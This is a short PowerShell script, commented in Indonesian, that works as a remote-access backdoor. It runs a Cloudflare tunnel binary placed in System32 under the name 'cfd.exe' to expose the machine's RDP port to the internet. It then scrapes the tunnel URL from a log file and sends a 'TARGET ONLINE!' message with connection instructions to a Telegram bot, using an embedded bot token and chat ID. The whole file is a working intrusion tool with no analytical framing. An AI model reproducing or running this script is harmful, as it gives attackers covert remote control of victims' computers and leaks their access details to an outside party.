$token = "8471384608:AAG2pvX7L2WHIzyghmdp9XXlXijGFCVnqFA"
$chatid = "8576006053"
$cfPath = "C:\Windows\System32\cfd.exe"

# Jalankan tunnel
Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:3389" -NoNewWindow -RedirectStandardError "C:\Windows\Temp\tunnel.log"

# Tunggu link terbentuk
Start-Sleep -Seconds 15

# Ambil link tunnel menggunakan Regex
$Log = Get-Content "C:\Windows\Temp\tunnel.log" -Raw
$URL = [regex]::match($Log, 'https://[a-zA-Z0-9-]+\.trycloudflare\.com').Value

# Kirim laporan ke Telegram (Plain Text Only)
if ($URL) {
    $Pesan = "TARGET ONLINE! URL: " + $URL + " | COMMAND: ./cfd.exe access tcp --hostname " + $URL + " --url localhost:8878"
    Invoke-RestMethod -Uri "[https://api.telegram.org/bot$token/sendMessage](https://api.telegram.org/bot$token/sendMessage)" -Method Post -Body @{chat_id=$chatid; text=$Pesan}
}
